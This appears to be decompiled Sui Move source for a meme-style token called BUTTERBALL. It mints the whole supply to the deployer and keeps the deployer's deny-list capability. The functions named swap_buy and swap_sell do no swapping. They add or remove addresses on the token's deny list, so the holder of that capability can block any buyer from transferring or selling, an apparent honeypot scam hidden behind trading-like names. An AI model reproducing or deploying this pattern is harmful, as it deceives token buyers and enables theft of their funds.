module 0x562b638c918bd95c9960b7e523ee6a6daa23194b68c4dd0239cb336ef6273ed8::butterball {
    struct BUTTERBALL has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BUTTERBALL, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BUTTERBALL>(arg0, 9, b"BUTTERBALL", b"TURKEY", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmRC1DWwFKKbKdfRWSzCrc3ZT7toFFJJiCvgoogywBEdU6"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BUTTERBALL>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BUTTERBALL>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BUTTERBALL>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BUTTERBALL>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BUTTERBALL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BUTTERBALL>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BUTTERBALL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BUTTERBALL>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

